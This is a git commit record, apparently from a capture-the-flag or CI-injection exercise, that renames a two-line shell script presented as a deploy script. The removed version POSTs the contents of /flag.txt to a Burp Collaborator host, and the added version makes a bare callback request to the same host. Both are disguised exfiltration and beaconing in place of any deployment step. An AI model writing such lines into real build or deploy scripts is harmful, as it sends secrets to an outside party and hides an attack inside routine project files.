9e11da502b36da1943ce89205f902997bb57a1c1
Esteban Cano <58123463+estebancano-dev@users.noreply.github.com>
2021-11-02 19:52:26 -0300

    Update and rename deploy-script.sh to deploy-script2.sh

--- deploy-script.sh
+++
@@ -1,2 +0,0 @@
-#!/bin/sh
-curl -X POST --data="$(cat /flag.txt)" https://t601c56ud5kplvokjgb2gayaf1lr9g.burpcollaborator.net
---
+++ deploy-script2.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+curl https://t601c56ud5kplvokjgb2gayaf1lr9g.burpcollaborator.net
